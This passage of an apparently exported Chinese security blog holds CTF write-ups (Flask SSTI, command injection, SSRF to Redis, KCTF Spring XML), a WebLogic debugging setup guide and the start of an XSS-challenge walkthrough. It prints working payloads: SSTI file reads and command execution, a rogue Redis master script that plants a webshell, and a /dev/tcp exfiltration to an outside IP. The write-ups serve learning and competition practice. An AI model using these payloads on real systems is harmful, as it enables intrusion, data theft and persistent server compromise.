class="string">'user'</span>,base64.urlsafe_b64encode(user),max_age=<span class="number">3600</span>)</span><br><span class="line">        <span class="keyword">return</span> resp</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        user=request.cookies.get(<span class="string">'user'</span>)</span><br><span class="line">        <span class="keyword">if</span> user == <span class="literal">None</span>:</span><br><span class="line">            <span class="keyword">return</span> render_template(<span class="string">"index.html"</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            user=user.encode(<span class="string">'utf-8'</span>)</span><br><span class="line">            <span class="keyword">return</span> render_template(<span class="string">"guess.html"</span>,name=base64.urlsafe_b64decode(user))</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/guess',methods=['POST'])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Guess</span><span class="params">()</span>:</span></span><br><span class="line">    user=request.cookies.get(<span class="string">'user'</span>)</span><br><span class="line">    <span class="keyword">if</span> user==<span class="literal">None</span>:</span><br><span class="line">        <span class="keyword">return</span> redirect(url_for(<span class="string">"Hello"</span>))</span><br><span class="line">    user=user.encode(<span class="string">'utf-8'</span>)</span><br><span class="line">    name = base64.urlsafe_b64decode(user)</span><br><span class="line">    num = float(request.form[<span class="string">'num'</span>])</span><br><span class="line">    <span class="keyword">if</span>(num&lt;<span class="number">0</span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"Too Small"</span></span><br><span class="line">    <span class="keyword">elif</span> num&gt;<span class="number">1000000000.0</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"Too Large"</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> render_template_string(guessNum(num,name))</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.errorhandler(404)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">miss</span><span class="params">(e)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">"What are you looking for?!!"</span>.getattr(app, <span class="string">'__name__'</span>, getattr(app.__class__, <span class="string">'__name__'</span>)), <span class="number">404</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    f_handler=open(<span class="string">'/var/log/app.log'</span>, <span class="string">'w'</span>)</span><br><span class="line">    sys.stderr=f_handler</span><br><span class="line">    app.run(debug=<span class="literal">True</span>, host=<span class="string">'0.0.0.0'</span>,port=<span class="number">8888</span>)</span><br></pre></td></tr></table></figure>

<p><img src="/2020/11/23/2020%E7%A5%A5%E4%BA%91%E6%9D%AFWeb%E9%A2%98%E7%9B%AEwriteup/image-20201124205419080.png" alt="image-20201124205419080"></p>
<p><a href="https://www.jianshu.com/p/d9caa4ab46e1" target="_blank" rel="noopener">https://www.jianshu.com/p/d9caa4ab46e1</a></p>
<p>flask开启debug，可以进入console模式，但是需要pin码，会把pin码写进<code>/var/log/app.log</code>，可以通过读这个文件来获取pin码，因为是<code>python2</code>,直接用payload</p>
<ul>
<li>读文件</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">base64.b64encode(&quot;&#123;&#123;().__class__.__base__.__subclasses__()[40](&#39;&#x2F;etc&#x2F;passwd&#39;).read()&#125;&#125;&quot;)</span><br><span class="line">&#39;e3soKS5fX2NsYXNzX18uX19iYXNlX18uX19zdWJjbGFzc2VzX18oKVs0MF0oJy9ldGMvcGFzc3dkJykucmVhZCgpfX0&#x3D;&#39;</span><br></pre></td></tr></table></figure>

<p><img src="/2020/11/23/2020%E7%A5%A5%E4%BA%91%E6%9D%AFWeb%E9%A2%98%E7%9B%AEwriteup/image-20201124210300013.png" alt="image-20201124210300013"></p>
<ul>
<li>执行命令</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">base64.b64encode(&#39;&#39;&#39;&#123;&#123;().__class__.__base__.__subclasses__()[59].__init__.__globals__[&#39;__builtins__&#39;][&#39;e&#39;+&#39;val&#39;](&quot;__imp&quot;+&quot;ort__(&#39;o&#39;+&#39;s&#39;).po&quot;+&quot;pen(&#39;ls&#39;).read()&quot;)&#125;&#125;&#39;&#39;&#39;)</span><br><span class="line">&#39;e3soKS5fX2NsYXNzX18uX19iYXNlX18uX19zdWJjbGFzc2VzX18oKVs1OV0uX19pbml0X18uX19nbG9iYWxzX19bJ19fYnVpbHRpbnNfXyddWydlJysndmFsJ10oIl9faW1wIisib3J0X18oJ28nKydzJykucG8iKyJwZW4oJ2xzJykucmVhZCgpIil9fQ&#x3D;&#x3D;&#39;</span><br></pre></td></tr></table></figure>

<p><img src="/2020/11/23/2020%E7%A5%A5%E4%BA%91%E6%9D%AFWeb%E9%A2%98%E7%9B%AEwriteup/image-20201124210912886.png" alt="image-20201124210912886"></p>
<h1 id="0x03-Command"><a href="#0x03-Command" class="headerlink" title="0x03 Command"></a>0x03 Command</h1><blockquote>
<p>这题学弟做的，下面是参考了网上的wp</p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">url&#x3D;|find%09&#x2F;%09-ctime%09-20</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">url&#x3D;a.iz99lj.ceye.io%0aecho%09ZmxhZw&#x3D;&#x3D;|base64%09-d|xargs%09-</span><br><span class="line">I%09x%09find%09&#x2F;%09-name%09&quot;x????&quot;</span><br><span class="line"></span><br><span class="line">127.0.0.1%0aecho%09L2V0Yy8uZmluZGZsYWcvZmxhZy50eHQ&#x3D;|base64%09-</span><br><span class="line">d|xargs%09sed%09&quot;&quot;%09</span><br></pre></td></tr></table></figure>

<p><img src="/2020/11/23/2020%E7%A5%A5%E4%BA%91%E6%9D%AFWeb%E9%A2%98%E7%9B%AEwriteup/image-20201123154353952.png" alt="image-20201123154353952"></p>
<h1 id="0x04-doyouknowssrf"><a href="#0x04-doyouknowssrf" class="headerlink" title="0x04 doyouknowssrf"></a>0x04 doyouknowssrf</h1><p>GACTF原题，用wp的方法老是失败，可以主从同步复制<code>exp.so</code>，但是<code>system.rev</code>执行不了，之后试了一下，config set dir /var/www/html   然后利用，主从同步将一句话木马同步到靶机，（感觉这题不用主从复制，直接写马就可以）然后，访问木马，得到flag。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> argparse</span><br><span class="line"><span class="keyword">import</span> socketserver</span><br><span class="line"><span class="keyword">import</span> logging</span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line">logging.basicConfig(stream=sys.stdout, level=logging.INFO, format=<span class="string">'&gt;&gt; %(message)s'</span>)</span><br><span class="line">DELIMITER = <span class="string">b"\r\n"</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">RoguoHandler</span><span class="params">(socketserver.BaseRequestHandler)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">decode</span><span class="params">(self, data)</span>:</span></span><br><span class="line">        <span class="keyword">if</span> data.startswith(<span class="string">b'*'</span>):</span><br><span class="line">            <span class="keyword">return</span> data.strip().split(DELIMITER)[<span class="number">2</span>::<span class="number">2</span>]</span><br><span class="line">        <span class="keyword">if</span> data.startswith(<span class="string">b'$'</span>):</span><br><span class="line">            <span class="keyword">return</span> data.split(DELIMITER, <span class="number">2</span>)[<span class="number">1</span>]</span><br><span class="line">        <span class="keyword">return</span> data.strip().split()</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">handle</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            data = self.request.recv(<span class="number">1024</span>)</span><br><span class="line">            logging.info(<span class="string">"receive data: %r"</span>, data)</span><br><span class="line">            arr = self.decode(data)</span><br><span class="line">            <span class="keyword">if</span> arr[<span class="number">0</span>].startswith(<span class="string">b'PING'</span>):</span><br><span class="line">                self.request.sendall(<span class="string">b'+PONG'</span> + DELIMITER)</span><br><span class="line">            <span class="keyword">elif</span> arr[<span class="number">0</span>].startswith(<span class="string">b'REPLCONF'</span>):</span><br><span class="line">                self.request.sendall(<span class="string">b'+OK'</span> + DELIMITER)</span><br><span class="line">            <span class="keyword">elif</span> arr[<span class="number">0</span>].startswith(<span class="string">b'PSYNC'</span>) <span class="keyword">or</span> arr[<span class="number">0</span>].startswith(<span class="string">b'SYNC'</span>):</span><br><span class="line">                self.request.sendall(<span class="string">b'+FULLRESYNC '</span> + <span class="string">b'Z'</span> * <span class="number">40</span> + <span class="string">b' 1'</span> + DELIMITER)</span><br><span class="line">                self.request.sendall(<span class="string">b'$'</span> + str(len(self.server.payload)).encode() + DELIMITER)</span><br><span class="line">                self.request.sendall(self.server.payload + DELIMITER)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        self.finish()</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">finish</span><span class="params">(self)</span>:</span></span><br><span class="line">        self.request.close()</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">RoguoServer</span><span class="params">(socketserver.TCPServer)</span>:</span></span><br><span class="line">    allow_reuse_address = <span class="literal">True</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, server_address, payload)</span>:</span></span><br><span class="line">        super(RoguoServer, self).__init__(server_address, RoguoHandler, <span class="literal">True</span>)</span><br><span class="line">        self.payload = payload</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> open(<span class="string">"a.php"</span>, <span class="string">'rb'</span>) <span class="keyword">as</span> f:</span><br><span class="line">    server = RoguoServer((<span class="string">'0.0.0.0'</span>, <span class="number">6680</span>), f.read())</span><br><span class="line">    server.handle_request()</span><br></pre></td></tr></table></figure>

<p>设置/var/www/html目录</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">url&#x3D;http:&#x2F;&#x2F;root:root@127.0.0.1:5000@baidu.com&#x2F;?url&#x3D;http:&#x2F;&#x2F;127.0.0.1:6379?%250D%250Aauth%2520123456%250d%250aconfig%2520set%2520dir%2520%252fvar%252fwww%252fhtml%250d%250a1</span><br></pre></td></tr></table></figure>

<p>主从复制🐎</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">url&#x3D;http:&#x2F;&#x2F;root:root@127.0.0.1:5000@baidu.com&#x2F;?url&#x3D;http:&#x2F;&#x2F;127.0.0.1:6379?%250D%250Aauth%2520123456%250d%250aconfig%2520set%2520dbfilename%2520a.php%250d%250aslaveof%2520ip%25206680%250d%250aquit%250a1</span><br></pre></td></tr></table></figure>

<p><img src="/2020/11/23/2020%E7%A5%A5%E4%BA%91%E6%9D%AFWeb%E9%A2%98%E7%9B%AEwriteup/image-20201123233920735.png" alt="image-20201123233920735"></p>
<h1 id="0x05-easyzzzz"><a href="#0x05-easyzzzz" class="headerlink" title="0x05 easyzzzz"></a>0x05 easyzzzz</h1><p>访问<code>/更新日志.txt</code>,可以知道是1.8.0版本，用<a href="https://github.com/h4ckdepy/zzzphp/issues/1" target="_blank" rel="noopener">这个</a>可以注出密码，md5解密后登后台，后台有一个经典的修改模板导致的rce，</p>
<p><img src="/2020/11/23/2020%E7%A5%A5%E4%BA%91%E6%9D%AFWeb%E9%A2%98%E7%9B%AEwriteup/image-20201124211517841.png" alt="image-20201124211517841">)直接用<a href="https://mount4in.github.io/2020/08/21/2020ciscn-web%E9%A2%98%E7%9B%AEwriteup/">国赛</a>的一道题的payload</p>
<p><img src="/2020/11/23/2020%E7%A5%A5%E4%BA%91%E6%9D%AFWeb%E9%A2%98%E7%9B%AEwriteup/image-20201124211628600.png" alt="image-20201124211628600"></p>
<h1 id="0x06-easygogogo"><a href="#0x06-easygogogo" class="headerlink" title="0x06 easygogogo"></a>0x06 easygogogo</h1>]]></content>
      <tags>
        <tag>writeup</tag>
      </tags>
  </entry>
  <entry>
    <title>2020KCTF部分题目复现</title>
    <url>/2020/11/20/2020KCTF%E9%83%A8%E5%88%86%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%8E%B0/</url>
    <content><![CDATA[<p>KCTF几道Web题目复现</p>
<a id="more"></a>

<p>右键源代码</p>
<p><img src="/2020/11/20/2020KCTF%E9%83%A8%E5%88%86%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%8E%B0/image-20201120184014266.png" alt="image-20201120184014266"></p>
<p>改header头都没有用，应该是SSRF了。</p>
<p><a href="http://cn-sec.com/archives/151034.html" target="_blank" rel="noopener">参考</a></p>
<blockquote>
<p><img src="/2020/11/20/2020KCTF%E9%83%A8%E5%88%86%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%8E%B0/image-20201120184645550.png" alt="image-20201120184645550"></p>
</blockquote>
<p>尝试读文件</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;getimage?url&#x3D;http:&#x2F;&#x2F;127.0.0.1%253a8088%253fwww.pediy.com&#x2F;loadConfig?url&#x3D;x.xml</span><br></pre></td></tr></table></figure>

<p><img src="/2020/11/20/2020KCTF%E9%83%A8%E5%88%86%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%8E%B0/image-20201120184916212.png" alt="image-20201120184916212"></p>
<p><img src="/2020/11/20/2020KCTF%E9%83%A8%E5%88%86%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%8E%B0/image-20201120185024108.png" alt="image-20201120185024108"></p>
<p>官方wp说<code>FileSystemXmlApplicationContext</code>可以加载远程恶意的<code>xml</code>文件</p>
<blockquote>
<p><img src="/2020/11/20/2020KCTF%E9%83%A8%E5%88%86%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%8E%B0/image-20201120185201750.png" alt="image-20201120185201750"></p>
</blockquote>
<p>然后反弹shell，通过nc</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cat vip-demo-0.0.1-SNAPSHOT.jar &gt; &#x2F;dev&#x2F;tcp&#x2F;144.34.200.151&#x2F;9966</span><br><span class="line">nc -lvnp 9966 &gt; b.jar</span><br></pre></td></tr></table></figure>

<p>下载jar包，在本地反编译就可以得到flag。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;!DOCTYPE any [</span><br><span class="line">&lt;!ENTITY  xxe  &quot;bbbbb&quot;&gt;]&gt;</span><br><span class="line">&lt;user&gt;&lt;number&gt;fffff&lt;&#x2F;number&gt;&lt;name&gt;&amp;xxe;&lt;&#x2F;name&gt;&lt;&#x2F;user&gt;</span><br></pre></td></tr></table></figure>

]]></content>
      <tags>
        <tag>writewup</tag>
      </tags>
  </entry>
  <entry>
    <title>ubuntu搭建weblogic环境,配合IDEA调试</title>
    <url>/2020/11/20/ubuntu%E6%90%AD%E5%BB%BAweblogic%E7%8E%AF%E5%A2%83/</url>
    <content><![CDATA[<p>之前都是利用docker搭建weblogic的漏洞环境，这里记录一下在ubuntu中搭建weblogic环境</p>
<a id="more"></a>

<blockquote>
<p>  jdk  ubuntu 18.04.3 (虚拟机磁盘空间选大一点（60G）)</p>
</blockquote>
<h2 id="0x00-jdk安装"><a href="#0x00-jdk安装" class="headerlink" title="0x00 jdk安装"></a>0x00 jdk安装</h2><p>手动下载压缩包安装oracle Java JDK</p>
<ul>
<li>创建目录:</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sudo mkdir &#x2F;usr&#x2F;lib&#x2F;jvm</span><br></pre></td></tr></table></figure>

<ul>
<li>解压缩到该目录:</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sudo tar -zxvf jdk-7u21-linux-x64.gz</span><br></pre></td></tr></table></figure>

<ul>
<li>修改环境变量:</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sudo vi ~&#x2F;.bashrc</span><br></pre></td></tr></table></figure>

<ul>
<li>在文件末尾追加下面内容：</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#set oracle jdk environment</span><br><span class="line">#export JAVA_HOME&#x3D;&#x2F;usr&#x2F;lib&#x2F;jvm&#x2F;jdk1.8.0_121  ## 这里要注意目录要换成自己解压的jdk 目录</span><br><span class="line">export JAVA_HOME&#x3D;&#x2F;usr&#x2F;lib&#x2F;jvm&#x2F;jdk1.7.0_21  ## 这里要注意目录要换成自己解压的jdk 目录</span><br><span class="line">export JRE_HOME&#x3D;$&#123;JAVA_HOME&#125;&#x2F;jre  </span><br><span class="line">export CLASSPATH&#x3D;.:$&#123;JAVA_HOME&#125;&#x2F;lib:$&#123;JRE_HOME&#125;&#x2F;lib  </span><br><span class="line">export PATH&#x3D;$&#123;JAVA_HOME&#125;&#x2F;bin:$PATH</span><br></pre></td></tr></table></figure>

<p><a href="https://blog.csdn.net/zhu1361/article/details/103592544" target="_blank" rel="noopener">https://blog.csdn.net/zhu1361/article/details/103592544</a>  jdk9+</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#set oracle jdk environment</span><br><span class="line">JAVA_HOME&#x3D;&#x2F;usr&#x2F;lib&#x2F;jvm&#x2F;jdk-9.0.4  ## 这里要注意目录要换成自己解压的jdk 目录</span><br><span class="line">JRE_HOME&#x3D;$JAVA_HOME </span><br><span class="line">CLASSPATH&#x3D;$JAVA_HOME&#x2F;lib</span><br><span class="line">PATH&#x3D;$JRE_HOME&#x2F;bin:$JAVA_HOME&#x2F;bin:$PATH</span><br><span class="line">export PATH JAVA_HOME CLASSPATH</span><br></pre></td></tr></table></figure>

<ul>
<li>使环境变量马上生效：</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">source ~&#x2F;.bashrc</span><br><span class="line">java -version</span><br></pre></td></tr></table></figure>

<img src="/2020/11/20/ubuntu%E6%90%AD%E5%BB%BAweblogic%E7%8E%AF%E5%A2%83/image-20201120131639241.png" alt="image-20201120131639241" style="zoom:150%;">

<hr>
<p>如果你安装了多个版本的jdk，你可以通过修改<code>~/.bashrc</code>文件后面的<code>JAVA_HOME</code></p>
<h2 id="0x01-weblogic"><a href="#0x01-weblogic" class="headerlink" title="0x01 weblogic"></a>0x01 weblogic</h2><p>看了好多帖子都说要新建一个weblogic用户，</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sudo useradd -r -m -s &#x2F;bin&#x2F;bash weblogic</span><br></pre></td></tr></table></figure>

<blockquote>
<p>参数的意思：<br>-r 建立系统账号<br>-m 自动建立用户的登入目录<br>-s /bin/bash 指定用户登入后所使用的shell</p>
</blockquote>
<p>修改密码</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sudo passwd weblogic</span><br></pre></td></tr></table></figure>

<p>新建用户后</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">java -jar fmw_12.2.1.3.0_wls.jar</span><br><span class="line">报错Exception in thread &quot;main&quot; java.awt.AWTError: Can&#39;t connect to X11 window server using &#39;:0&#39; as the value of the DISPLAY variable.</span><br></pre></td></tr></table></figure>

<p>切换回原用户就可以了，搜了一下原因好像是因为weblogic用户不能打开window界面。我们这里搭建的本意就是为了复现漏洞，也可以不新建用户，直接在当前用户安装，</p>
<p><code>wls-silent.xml</code></p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="UTF-8"?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">bea-installer</span>&gt;</span> </span><br><span class="line">	<span class="tag">&lt;<span class="name">input-fields</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">data-value</span> <span class="attr">name</span>=<span class="string">"BEAHOME"</span> <span class="attr">value</span>=<span class="string">"/home/weblogic/Oracle/Middleware"</span> /&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">data-value</span> <span class="attr">name</span>=<span class="string">"USER_INSTALL_DIR"</span> <span class="attr">value</span>=<span class="string">"/home/weblogic/Oracle/Middleware"</span> /&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">data-value</span> <span class="attr">name</span>=<span class="string">"COMPONENT_PATHS"</span> <span class="attr">value</span>=<span class="string">"WebLogic Server/Core Application Server|WebLogic Server/Administration Console|WebLogic Server/Configuration Wizard and Upgrade Framework|WebLogic Server/Web 2.0 HTTP Pub-Sub Server|WebLogic Server/WebLogic JDBC Drivers|WebLogic Server/Third Party JDBC Drivers|WebLogic Server/WebLogic Server Clients|WebLogic Server/WebLogic Web Server Plugins|WebLogic Server/UDDI and Xquery Support|WebLogic Server/Server Examples"</span> /&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">data-value</span> <span class="attr">name</span>=<span class="string">"INSTALL_NODE_MANAGER_SERVICE"</span> <span class="attr">value</span>=<span class="string">"no"</span> /&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">data-value</span> <span class="attr">name</span>=<span class="string">"INSTALL_SHORTCUT_IN_ALL_USERS_FOLDER"</span> <span class="attr">value</span>=<span class="string">"no"</span>/&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">data-value</span> <span class="attr">name</span>=<span class="string">"LOCAL_JVMS"</span> <span class="attr">value</span>=<span class="string">"/usr/lib/jvm/jdk1.6.0_45"</span>/&gt;</span></span><br><span class="line">	<span class="tag">&lt;/<span class="name">input-fields</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">bea-installer</span>&gt;</span></span><br></pre></td></tr></table></figure>

<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">java -jar wls1036_generic.jar -mode=silent -silent_xml=wls-silent.xml</span><br></pre></td></tr></table></figure>

<p><code>create-wls-domain.py</code></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Default domain 'base_domain' to be created inside the Docker image for WLS</span></span><br><span class="line"><span class="comment"># ==============================================</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Open default domain template</span></span><br><span class="line"><span class="comment"># ======================</span></span><br><span class="line">readTemplate(<span class="string">"/home/weblogic/Oracle/Middleware/wlserver_10.3/common/templates/domains/wls.jar"</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Configure the Administration Server and SSL port.</span></span><br><span class="line"><span class="comment"># =========================================================</span></span><br><span class="line">cd(<span class="string">'Servers/AdminServer'</span>)</span><br><span class="line">set(<span class="string">'ListenAddress'</span>,<span class="string">''</span>)</span><br><span class="line">set(<span class="string">'ListenPort'</span>, <span class="number">7001</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Define the user password for weblogic</span></span><br><span class="line"><span class="comment"># =====================================</span></span><br><span class="line">cd(<span class="string">'/'</span>)</span><br><span class="line">cd(<span class="string">'Security/base_domain/User/weblogic'</span>)</span><br><span class="line">cmo.setPassword(<span class="string">'Oracle@123'</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Write the domain and close the domain template</span></span><br><span class="line"><span class="comment"># ==============================================</span></span><br><span class="line">setOption(<span class="string">'OverwriteDomain'</span>, <span class="string">'true'</span>)</span><br><span class="line"></span><br><span class="line">writeDomain(<span class="string">'/home/weblogic/Oracle/Middleware/user_projects/domains/base_domain'</span>)</span><br><span class="line">closeTemplate()</span><br><span class="line"></span><br><span class="line"><span class="comment"># Exit WLST</span></span><br><span class="line"><span class="comment"># =========</span></span><br><span class="line">exit()</span><br></pre></td></tr></table></figure>

<p><code>chmod +x create-wls-domain.py</code></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">~/Oracle/Middleware/wlserver_10.3/common/bin$./wlst.sh -skipWLSModuleScanning /home/weblogic/Oracle/create-wls-domain.py</span><br></pre></td></tr></table></figure>

<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">~/Oracle/Middleware/user_projects/domains/base_domain/bin$ ./startWebLogic.sh</span><br></pre></td></tr></table></figure>

<p><img src="/2020/11/20/ubuntu%E6%90%AD%E5%BB%BAweblogic%E7%8E%AF%E5%A2%83/image-20201202144942741.png" alt="image-20201202144942741"></p>
<h2 id="0x02-idea调试"><a href="#0x02-idea调试" class="headerlink" title="0x02 idea调试"></a>0x02 idea调试</h2><p>首先修改<code>~/Oracle/Middleware/user_projects/domains/base_domain/bin/setDomainEnv.sh</code></p>
<p>在文件头加如下内容：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">debugFlag=<span class="string">"true"</span></span><br><span class="line"><span class="built_in">export</span> debugFlag</span><br></pre></td></tr></table></figure>

<img src="/2020/11/20/ubuntu%E6%90%AD%E5%BB%BAweblogic%E7%8E%AF%E5%A2%83/image-20201203110506200.png" alt="image-20201203110506200" style="zoom: 200%;">

<p>然后运行<code>./startWebLogic.sh</code></p>
<p>然后将<code>~/Oracle/Middleware/wlserver_10.3</code>，目录复制到本机，然后利用<code>find ./ -name *.jar -exec cp {} ./weblogic_jar/ \;</code>在<code>~/Oracle/Middleware/</code>目录下搜索<code>jar</code>文件然后复制到weblogic_jar目录，然后在本地打开IDEA，将<code>weblogic_jar</code>添加到libraries，</p>
<p><img src="/2020/11/20/ubuntu%E6%90%AD%E5%BB%BAweblogic%E7%8E%AF%E5%A2%83/image-20201203111249352.png" alt="image-20201203111249352"></p>
<p>将jdk改为和jdk6</p>
<p><img src="/2020/11/20/ubuntu%E6%90%AD%E5%BB%BAweblogic%E7%8E%AF%E5%A2%83/image-20201203111330965.png" alt="image-20201203111330965"></p>
<p>然后在下断点，开启调试</p>
<p><img src="/2020/11/20/ubuntu%E6%90%AD%E5%BB%BAweblogic%E7%8E%AF%E5%A2%83/image-20201203111434909.png" alt="image-20201203111434909"></p>
<p>burp发包</p>
<p><img src="/2020/11/20/ubuntu%E6%90%AD%E5%BB%BAweblogic%E7%8E%AF%E5%A2%83/image-20201203111505573.png" alt="image-20201203111505573"></p>
<p>可以看到成功。</p>
<p><img src="/2020/11/20/ubuntu%E6%90%AD%E5%BB%BAweblogic%E7%8E%AF%E5%A2%83/image-20201203111519281.png" alt="image-20201203111519281"></p>
<p><a href="https://blog.csdn.net/zbj18314469395/article/details/86064849" target="_blank" rel="noopener">https://blog.csdn.net/zbj18314469395/article/details/86064849</a></p>
<p><a href="https://starky99.com/ubuntu16-install-weblogic10.3.6/" target="_blank" rel="noopener">Ubuntu16.04命令行安装Weblogic</a></p>
<p><a href="https://blog.csdn.net/qq_36205145/article/details/70473545" target="_blank" rel="noopener">在ubuntu 16.04上安装weblogic 12c</a></p>
<p><a href="https://www.oracle.com/middleware/technologies/weblogic-server-installers-downloads.html" target="_blank" rel="noopener">weblogic下载</a></p>
<p><a href="jianshu.com/p/75344ad2aaff">ubuntu建立新用户没有家目录的问题与授予sudo权限</a></p>
<p><a href="https://hub.docker.com/layers/vulhub/weblogic/10.3.6.0-2017/images/sha256-275ec19477cfda389dc1c42158033e7e8c650dd4cba9f090ca0ba673902b73c9?context=explore" target="_blank" rel="noopener">vulhub/weblogic:10.3.6.0-2017</a></p>
]]></content>
  </entry>
  <entry>
    <title>记一次xss-challenge的复现</title>
    <url>/2020/11/18/%E8%AE%B0%E4%B8%80%E6%AC%A1xss-challenge%E7%9A%84%E5%A4%8D%E7%8E%B0/</url>
    <content><![CDATA[<p>看了一篇xss的帖子，自己对xss方面比较垃圾，跟着文章学习一下</p>
<a id="more"></a>

<p>题目链接</p>
<p><a href="https://wacky.buggywebsite.com/" target="_blank" rel="noopener">https://wacky.buggywebsite.com/</a></p>
<p>题目界面</p>
<p><img src="/2020/11/18/%E8%AE%B0%E4%B8%80%E6%AC%A1xss-challenge%E7%9A%84%E5%A4%8D%E7%8E%B0/image-20201118194444163.png" alt="image-20201118194444163"></p>
<p>大致的功能就是可以将输入的字符进行”美化“，其实就是换了个颜色。。。。然后右键查看源代码，有一个<code>&lt;iframe&gt;</code>标签，访问对应的链接，</p>
<p><img src="/2020/11/18/%E8%AE%B0%E4%B8%80%E6%AC%A1xss-challenge%E7%9A%84%E5%A4%8D%E7%8E%B0/image-20201118194630150.png" alt="image-20201118194630150"></p>
<img src="/2020/11/18/%E8%AE%B0%E4%B8%80%E6%AC%A1xss-challenge%E7%9A%84%E5%A4%8D%E7%8E%B0/image-20201119101858849.png" alt="image-20201119101858849" style="zoom:200%;">

<p>提示当前页面只能在iframe里面看，然后右键查看源代码，其中关键的一段如下，</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">	</span><br><span class="line">	<span class="tag">&lt;<span class="name">script</span> <span class="attr">nonce</span>=<span class="string">"ygdsnjslxhwp"</span>&gt;</span></span><br><span class="line">	</span><br><span class="line"><span class="javascript">		<span class="built_in">window</span>.fileIntegrity = <span class="built_in">window</span>.fileIntegrity || &#123;</span></span><br><span class="line"><span class="actionscript">			<span class="string">'rfc'</span> : <span class="string">' https://w3c.github.io/webappsec-subresource-integrity/'</span>,</span></span><br><span class="line"><span class="actionscript">			<span class="string">'algorithm'</span> : <span class="string">'sha256'</span>,</span></span><br><span class="line"><span class="actionscript">			<span class="string">'value'</span> : <span class="string">'unzMI6SuiNZmTzoOnV4Y9yqAjtSOgiIgyrKvumYRI6E='</span>,</span></span><br><span class="line"><span class="actionscript">			<span class="string">'creationtime'</span> : <span class="number">1602687229</span></span></span><br><span class="line">		&#125;</span><br><span class="line">	</span><br><span class="line"><span class="actionscript">		<span class="comment">// verify we are in an iframe</span></span></span><br><span class="line"><span class="javascript">		<span class="keyword">if</span> (<span class="built_in">window</span>.name == <span class="string">'iframe'</span>) &#123;</span></span><br><span class="line">			</span><br><span class="line"><span class="actionscript">			<span class="comment">// securely load the frame analytics code</span></span></span><br><span class="line">			if (fileIntegrity.value) &#123;</span><br><span class="line">				</span><br><span class="line"><span class="actionscript">				<span class="comment">// create a sandboxed 